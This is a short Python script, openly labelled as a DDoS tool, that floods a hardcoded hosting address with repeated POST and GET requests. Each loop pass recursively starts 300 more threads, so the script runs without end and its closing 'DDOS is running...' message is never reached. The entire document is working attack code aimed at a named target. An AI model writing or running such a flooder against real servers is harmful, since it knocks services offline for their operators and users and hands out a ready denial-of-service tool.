import requests
from threading import Thread

url = "http://sosed.byethost6.com"
thrnom = 300
aaa = bool(1)

def ddos():
    while (aaa):
        spam = requests.post(url)
        spam2 = requests.get(url)
        for i in range(int(thrnom)):
            thr = Thread(target = ddos)
            thr.start()

ddos()   
print('DDOS is running...')